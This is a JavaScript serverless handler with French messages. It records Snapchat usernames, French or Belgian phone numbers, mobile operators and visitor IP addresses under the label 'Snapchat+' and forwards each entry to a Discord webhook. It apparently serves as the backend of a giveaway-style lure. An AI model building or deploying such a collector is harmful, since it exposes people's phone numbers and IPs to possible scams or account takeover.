import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

  try {
    const { username, phone, location, operator, lang } = req.body;
    if (!username || !phone || !location || !operator) {
      return res.status(400).json({ success: false, message: 'Champs requis manquants' });
    }

    if (!/^[a-zA-Z0-9._-]{3,15}$/.test(username)) {
      return res.status(400).json({ success: false, message: 'Format username invalide' });
    }

    const phoneClean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^\+32/, '0');
    const isBe = location === 'belgique';
    const phoneRegex = isBe ? /^04[0-9]{8}$/ : /^0[67][0-9]{8}$/;
    if (!phoneRegex.test(phoneClean)) {
      return res.status(400).json({ success: false, message: 'Numéro invalide' });
    }

    if (!process.env.DATABASE_URL) throw new Error('DATABASE_URL non configurée');
    const sql = neon(process.env.DATABASE_URL);

    // ─── Vérifier si l'IP est bannie ───
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || 'unknown';
    const banned = await sql`SELECT 1 FROM banned_ips WHERE ip_address = ${ip} LIMIT 1`;
    if (banned.length > 0) {
      return res.status(403).json({ success: false, message: 'Accès refusé' });
    }

    const existing = await sql`SELECT id FROM snap_requests WHERE phone = ${phoneClean} OR username = ${username.toLowerCase()} LIMIT 1`;
    if (existing.length > 0) {
      return res.status(409).json({ success: false, message: 'Demande déjà enregistrée' });
    }

    const country = isBe ? 'Belgique' : 'France';
    const city = 'Inconnue';

    const result = await sql`
      INSERT INTO snap_requests (username, phone, location, operator, lang, status, ip_address, country, city)
      VALUES (${username.toLowerCase()}, ${phoneClean}, ${location}, ${operator}, ${lang || 'fr'}, 'pending', ${ip}, ${country}, ${city})
      RETURNING id, username, phone, operator, country, city, ip_address, created_at
    `;

    const row = result[0];

    // ─── Webhook Discord ───
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        const carrierNames = {
          'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
          'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
        };
        const embed = {
          title: '📱 Nouvelle demande Snapchat+',
          color: 0xfffc00,
          fields: [
            { name: '👤 Username', value: row.username, inline: true },
            { name: '📞 Téléphone', value: row.phone, inline: true },
            { name: '📡 Opérateur', value: carrierNames[row.operator] || row.operator, inline: true },
            { name: '🌍 Pays', value: row.country, inline: true },
            { name: '🏙️ Ville', value: row.city, inline: true },
            { name: '🌐 IP', value: row.ip_address, inline: true },
            { name: '⏰ Date', value: new Date(row.created_at).toLocaleString('fr-FR'), inline: false }
          ],
          footer: { text: `ID: ${row.id}` },
          timestamp: new Date().toISOString()
        };
        await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });
      } catch (e) {
        console.error('Webhook error:', e);
      }
    }

    return res.status(200).json({
      success: true,
      message: 'Demande enregistrée',
      data: { id: row.id, username: row.username, phone: row.phone }
    });

  } catch (error) {
    console.error('Neon DB Error:', error);
    return res.status(500).json({ success: false, message: error.message || 'Erreur serveur' });
  }
}